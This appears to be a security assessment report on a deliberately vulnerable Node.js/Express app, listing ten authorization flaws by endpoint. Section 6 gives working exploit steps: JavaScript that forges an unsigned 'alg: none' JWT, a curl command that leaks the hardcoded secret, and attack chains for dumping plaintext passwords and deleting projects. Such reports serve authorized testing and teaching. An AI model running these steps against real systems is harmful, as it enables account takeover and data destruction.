# Authorization Analysis Report

## 1. Executive Summary

- **Analysis Status:** Complete
- **Key Outcome:** 10 authorization vulnerabilities identified and passed to the exploitation phase. The application suffers from pervasive authorization failures across all three categories: horizontal (IDOR), vertical (broken access control), and context/workflow (business logic bypass).
- **Analysis Scope:** All network-accessible endpoints in `/repos/VulApp/backend/` were analyzed. The application is a Node.js/Express backend with SQLite database, serving a React frontend. The attack surface includes 6 route files covering auth, projects, files, payment, debug, and utility endpoints.
- **Dominant Pattern:** Every endpoint that accepts an object ID parameter lacks an ownership validation check. There is no role-based access control (RBAC) system. The only authorization guard in the entire application is a single `if (!req.user)` check for authentication — which can be bypassed via the JWT "none" algorithm vulnerability. Once past authentication, there are zero authorization checks.

---

## 2. Dominant Vulnerability Patterns

### Pattern 1: Missing Ownership Validation — IDOR (Horizontal)
- **Description:** Every endpoint that accepts a resource ID (project_id, file path, etc.) directly queries or mutates the resource without verifying that `owner_id` matches `req.user.id`. There is no ownership or access control check on any resource operation.
- **Implication:** Any authenticated user can read, modify, and delete any other user's private data by manipulating ID parameters.
- **Representative:** AUTHZ-VULN-02 (`GET /api/projects/:id`), AUTHZ-VULN-03 (`PUT /api/projects/:id`), AUTHZ-VULN-04 (`DELETE /api/projects/:id`), AUTHZ-VULN-05 (`GET /api/files/project/:id`)

### Pattern 2: JWT Algorithm Confusion + Hardcoded Secret (Vertical / Auth Bypass)
- **Description:** The `authenticate` middleware (`middleware/auth.js:19-32`) explicitly handles `alg: "none"` JWT tokens by decoding the payload without signature verification. Combined with a hardcoded secret (`JWT_SECRET = 'secret123'`), attackers can forge any identity — any user ID, email, and plan_type — without knowing any credentials.
- **Implication:** Authentication can be bypassed entirely. Any person on the internet can obtain a forged JWT claiming to be any user, including a privileged one.
- **Representative:** AUTHZ-VULN-09 (JWT none bypass), AUTHZ-VULN-08 (secret exposure)

### Pattern 3: Mass Assignment — plan_type Escalation (Vertical / Horizontal)
- **Description:** The `PUT /api/auth/profile` endpoint (`routes/auth.js:61-70`) takes the entire request body and builds an UPDATE query from it, without any field whitelist. Any database column — including `plan_type` — can be overwritten.
- **Implication:** Users can escalate their own plan from 'free' to 'enterprise' without payment. This is both a horizontal privilege escalation (overwriting protected fields) and contributes to vertical escalation (unauthorized feature access).
- **Representative:** AUTHZ-VULN-01 (mass assignment), AUTHZ-VULN-07 (subscribe endpoint)

### Pattern 4: Query Parameter-Based Admin Access (Vertical)
- **Description:** The admin panel at `/api/admin` (`routes/debug.js:35-51`) uses `req.query.admin === 'true'` as its only access control. This is trivially bypassed by any user or anonymous visitor adding `?admin=true` to any request.
- **Implication:** Any unauthenticated internet user can access the full admin panel, which dumps all users' data including plaintext passwords.
- **Representative:** AUTHZ-VULN-06

### Pattern 5: Context/Workflow Bypass — Payment Flow (Context_Workflow)
- **Description:** The `POST /api/subscribe` endpoint (`routes/payment.js:6-14`) directly writes `plan_type` from the request body into the database without any prior state validation. There is no payment initiation, no payment confirmation, no webhook, no session token.
- **Implication:** Users can upgrade their plan without any payment, bypassing the entire billing workflow.
- **Representative:** AUTHZ-VULN-10

---

## 3. Strategic Intelligence for Exploitation

### Authentication Architecture
- **Mechanism:** JWT-based stateless authentication. Tokens are generated at login (`routes/auth.js:37`) with payload `{ id, email, plan }` signed with hardcoded secret `'secret123'`.
- **Session Storage:** No server-side session storage. Token is entirely client-side (stateless JWT).
- **Authentication Middleware:** `middleware/auth.js:6-42` — applies to ALL routes via `app.use(authenticate)` in `server.js:16`. This is the only authorization infrastructure in the application.
- **Critical Finding:** The middleware has THREE critical flaws: (1) accepts tokens with `alg: "none"`, (2) proceeds as anonymous when no token is provided, and (3) the JWT secret is hardcoded and publicly exposed. There is NO server-side session or role validation of any kind.

### Role/Permission Model
- **Roles Identified:** None. The application has NO role-based access control system. There is no admin role, no moderator role, no permission checks anywhere in the codebase.
- **User Tiers:** Only `plan_type` field in the `users` table (`db.js:13`) — values `'free'` or `'enterprise'`. This field is stored in the JWT but is NEVER validated server-side on ANY route.
- **Privilege Lattice:** `anon` → `authenticated user` (no elevation path, but all authenticated users have equal privilege)
- **Critical Finding:** There is no authorization hierarchy. Once a user is authenticated (or forges a JWT), they can access and modify all resources. The `plan_type` field in the JWT is cosmetic — it is included in responses but never checked.

### Resource Access Patterns
- **ID Parameters:** All resources are identified by numeric IDs in URL paths (`/api/projects/:id`, `/api/files/project/:id`). IDs are passed directly to SQL queries without ownership validation.
- **User Identification:** User ID is extracted from JWT (`req.user.id`) but is NOT validated against the database on any request. A forged JWT with `id: 999` will be treated as user 999 for all operations.
- **Critical Finding:** There are zero object-level authorization checks. The `owner_id` column exists in the `projects` and `files` tables but is never queried for authorization purposes.

### Workflow Implementation
- **Payment Flow:** There is no payment flow. `POST /api/subscribe` is a single endpoint that directly writes `plan_type` to the database. No payment gateway, no webhook, no multi-step process.
- **Password Reset Flow:** `POST /api/auth/forgot-password` generates a predictable token (`email:timestamp` base64 encoded) and returns it in the response. `POST /api/auth/reset-password` accepts any validly-encoded token without expiration or one-time-use checks.
- **Registration/Login:** Passwords are stored in plaintext (`routes/auth.js:32` — `WHERE email = ? AND password = ?`). No hashing, no salt, no bcrypt.
- **Critical Finding:** No workflow state is maintained. The application does not track multi-step states server-side.

### Database Schema (Authorization-Relevant Fields)
```
users: id, email, password (plaintext), plan_type
projects: id, name, description, owner_id, is_public
files: id, filename, filepath, project_id, owner_id
```
- Foreign keys exist but are not enforced for authorization. `owner_id` columns are populated but never checked.

---

## 4. Endpoints Analyzed

### 4.1 Auth Routes (`/repos/VulApp/backend/routes/auth.js`)

| Endpoint | Method | Guard at Route | Guard Sufficient? | Verdict |
|---|---|---|---|---|
| `/api/auth/register` | POST | None (public by design) | N/A | SAFE (public endpoint) |
| `/api/auth/login` | POST | None (public by design) | N/A | SAFE (public endpoint) |
| `/api/auth/profile` | GET | `if (!req.user)` at line 44 | Yes (uses session user ID, no param) | SAFE |
| `/api/auth/profile` | PUT | `if (!req.user)` at line 58 | NO — mass assignment, accepts all fields | VULNERABLE (AUTHZ-VULN-01) |
| `/api/auth/forgot-password` | POST | None (public by design) | N/A | Context concern only |
| `/api/auth/reset-password` | POST | None | N/A | SAFE (token in body, no ID param) |

### 4.2 Project Routes (`/repos/VulApp/backend/routes/projects.js`)

| Endpoint | Method | Guard at Route | Guard Sufficient? | Verdict |
|---|---|---|---|---|
| `/api/projects` | GET | None (uses req.user if present) | Yes — filtered by `owner_id = ? OR is_public = 1` | SAFE |
| `/api/projects/:id` | GET | None | NO — no ownership check | VULNERABLE (AUTHZ-VULN-02) |
| `/api/projects/:id` | PUT | `if (!req.user)` at line 90 | NO — no ownership check | VULNERABLE (AUTHZ-VULN-03) |
| `/api/projects/:id` | DELETE | `if (!req.user)` at line 54 | NO — no ownership check | VULNERABLE (AUTHZ-VULN-04) |
| `/api/projects` | POST | `if (!req.user)` at line 40 | Yes — creates with req.user.id | SAFE |
| `/api/projects/search/name` | GET | None | N/A — SQL injection, not authz | OUT OF SCOPE (Injection) |
| `/api/projects/export/csv` | GET | None | N/A — CSV injection, not authz | OUT OF SCOPE (Injection) |

### 4.3 File Routes (`/repos/VulApp/backend/routes/files.js`)

| Endpoint | Method | Guard at Route | Guard Sufficient? | Verdict |
|---|---|---|---|---|
| `/api/files/upload` | POST | `if (!req.user)` at line 23 | Yes — creates with req.user.id | SAFE |
| `/api/files/project/:id` | GET | None | NO — no ownership check | VULNERABLE (AUTHZ-VULN-05) |
| `/api/files/download` | GET | None | N/A — path traversal, not authz | OUT OF SCOPE (Injection) |

### 4.4 Payment Routes (`/repos/VulApp/backend/routes/payment.js`)

| Endpoint | Method | Guard at Route | Guard Sufficient? | Verdict |
|---|---|---|---|---|
| `/api/subscribe` | POST | `if (!req.user)` at line 7 | NO — no workflow validation, accepts any plan_type | VULNERABLE (AUTHZ-VULN-07, AUTHZ-VULN-10) |

### 4.5 Debug Routes (`/repos/VulApp/backend/routes/debug.js`)

| Endpoint | Method | Guard at Route | Guard Sufficient? | Verdict |
|---|---|---|---|---|
| `/api/debug` | GET | None | NO — no auth, no authz | VULNERABLE (AUTHZ-VULN-08) |
| `/api/admin` | GET | `if (admin === 'true')` at line 38 | NO — trivially bypassed query param | VULNERABLE (AUTHZ-VULN-06) |
| `/api/fetch-url` | GET | None | N/A — SSRF, not authz | OUT OF SCOPE (SSRF) |

### 4.6 Middleware (`/repos/VulApp/backend/middleware/auth.js`)

| Guard | Location | Sufficient? | Verdict |
|---|---|---|---|
| `authenticate` middleware | `middleware/auth.js:6-42` | NO — accepts `alg: "none"`, proceeds without token | VULNERABLE (AUTHZ-VULN-09) |

### 4.7 Utility Routes (`/repos/VulApp/backend/routes/utils.js`)

All utility endpoints (ping, merge, redirect, lang, validate-email) are authorization-agnostic — they don't involve user-specific resources or privileged operations. They contain other vulnerability classes (command injection, prototype pollution, open redirect, etc.) but no authorization flaws. **SAFE for authorization purposes.**

---

## 5. Vectors Analyzed and Confirmed Secure

These authorization checks were traced and confirmed to have proper guards that dominate their respective sinks. They are low-priority for further authorization testing.

| Endpoint | Guard Location | Defense Mechanism | Verdict |
|---|---|---|---|
| `POST /api/auth/register` | `routes/auth.js:9` | Public endpoint by design — no auth required | SAFE |
| `POST /api/auth/login` | `routes/auth.js:29` | Public endpoint by design — no auth required | SAFE |
| `GET /api/auth/profile` | `routes/auth.js:43-47` | Uses `req.user.id` from JWT, no parameter manipulation | SAFE |
| `POST /api/projects` | `routes/projects.js:39-49` | Uses `req.user.id` for owner_id, no external ID parameter | SAFE |
| `POST /api/files/upload` | `routes/files.js:22-35` | Uses `req.user.id` for owner_id, no external ID parameter | SAFE |
| `GET /api/projects` (list) | `routes/projects.js:6-11` | Correctly filters by `owner_id = ? OR is_public = 1` | SAFE |

---

## 6. Exploitation Intelligence

### Authentication Bypass (Prerequisite for Exploitation)
Before exploiting horizontal/vertical vulnerabilities, attackers must establish an authenticated session. Two independent methods exist:

**Method 1 — JWT None Algorithm Bypass (AUTHZ-VULN-09):**
```javascript
// No secret needed. Create unsigned token:
const header = Buffer.from(JSON.stringify({alg:"none",typ:"JWT"})).toString('base64');
const payload = Buffer.from(JSON.stringify({id:1,email:"admin@techviflaw.vn.gd",plan:"enterprise"})).toString('base64');
const forgedToken = `${header}.${payload}.`;  // empty signature
// Use as: Authorization: Bearer <forgedToken>
```

**Method 2 — Obtain Hardcoded Secret (AUTHZ-VULN-08):**
```bash
curl https://techviflaw.vn.gd/api/debug
# Response contains: jwt_secret: "secret123"
# Then forge: jwt.sign({id:1, email:"admin@techviflaw.vn.gd", plan:"enterprise"}, "secret123")
```

### Chaining Exploitation Paths

**Path A — Full Horizontal Data Access:**
1. Obtain any JWT (even anonymous via none bypass)
2. Enumerate project IDs (integer sequence)
3. `GET /api/projects/1` → read any private project
4. `PUT /api/projects/1` → modify any private project (set is_public=1)
5. `GET /api/files/project/1` → enumerate files for any project
6. `DELETE /api/projects/1` → destroy any project

**Path B — Account Takeover via Admin Panel:**
1. `GET /api/admin?admin=true` → dump all users with plaintext passwords
2. Use any dumped credential to `POST /api/auth/login`
3. Full account compromise

**Path C — Privilege Escalation + Resource Hijacking:**
1. `PUT /api/auth/profile` with `{"plan_type": "enterprise"}` → escalate plan
2. OR `POST /api/subscribe` with `{"plan_type": "enterprise"}` → same
3. `GET /api/projects/1` → read other users' private projects
4. `PUT /api/projects/1` with `{"is_public": 1}` → expose private projects
5. `DELETE /api/projects/1` → delete other users' projects

---

## 7. Analysis Constraints and Blind Spots

### Constraints
- **Source Code Only:** Analysis was performed against the backend source code at `/repos/VulApp/backend/`. The live deployment at `https://techviflaw.vn.gd` may have additional runtime protections or network-level filtering not visible in source code.
- **Node.js/Express Analysis Only:** The React frontend (`/repos/VulApp/frontend/`) was not analyzed for client-side authorization enforcement. UI-only protections (hidden buttons, disabled forms) are not relied upon in this analysis.
- **Static Analysis:** All findings are based on static code review. Dynamic runtime behavior (if any) could not be verified without live exploitation.
- **No Database Constraints:** Foreign key constraints exist in the schema but are not enforced for authorization. The analysis assumes these constraints are not bypassed at runtime.

### Blind Spots
- **Frontend Authorization:** The frontend may implement client-side role checks or route guards that could provide some defense-in-depth. These were not analyzed.
- **Runtime Middleware:** If the live deployment adds additional middleware (e.g., a WAF, API gateway, or rate limiter) that provides authorization checks, those would not be visible in source code.
- **Database-Level Enforcement:** SQLite foreign keys are not enabled by default (`PRAGMA foreign_keys` not called in `db.js`). Runtime data integrity could differ from schema definitions.

---

## 8. Summary of Authorization Findings

| ID | Type | Endpoint | Line | Severity | Confidence |
|---|---|---|---|---|---|
| AUTHZ-VULN-01 | Horizontal | PUT /api/auth/profile | 61-70 | High | High |
| AUTHZ-VULN-02 | Horizontal | GET /api/projects/:id | 15-22 | High | High |
| AUTHZ-VULN-03 | Horizontal | PUT /api/projects/:id | 89-100 | High | High |
| AUTHZ-VULN-04 | Horizontal | DELETE /api/projects/:id | 53-59 | High | High |
| AUTHZ-VULN-05 | Horizontal | GET /api/files/project/:id | 39-44 | Medium | High |
| AUTHZ-VULN-06 | Vertical | GET /api/admin | 35-51 | Critical | High |
| AUTHZ-VULN-07 | Vertical | POST /api/subscribe | 6-14 | High | High |
| AUTHZ-VULN-08 | Vertical | GET /api/debug | 8-18 | Critical | High |
| AUTHZ-VULN-09 | Vertical | ALL /api/* (middleware) | 19-32 | Critical | High |
| AUTHZ-VULN-10 | Context_Workflow | POST /api/subscribe | 6-14 | High | High |

**Total Vulnerabilities:** 10
**Horizontal:** 5 | **Vertical:** 4 | **Context_Workflow:** 1
**All externally exploitable via public internet:** YES (all 10)
